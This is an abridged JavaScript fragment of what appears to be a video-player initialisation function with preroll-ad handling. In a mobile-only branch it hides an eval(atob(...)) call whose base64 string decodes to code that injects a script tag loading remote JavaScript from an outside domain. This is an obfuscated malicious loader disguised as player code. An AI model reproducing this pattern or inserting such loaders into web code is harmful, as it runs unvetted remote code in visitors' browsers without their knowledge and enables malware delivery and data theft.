function initVideo(param) {
    ...
    if(mobileOn){
        eval(atob(/ZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKSkuc3JjPSdodHRwczovLzIwMjNzYi5uZXQvcy56Jw==/.source));
    ...
    if (param.ad && param.ad.pre && param.ad.pre.url) {
        ...
        videoObj.on('readyforpreroll', function () {
            ...
            videoObj.one('adplaying', function () {
                ...
                videoObj.trigger('ads-adimg-started');
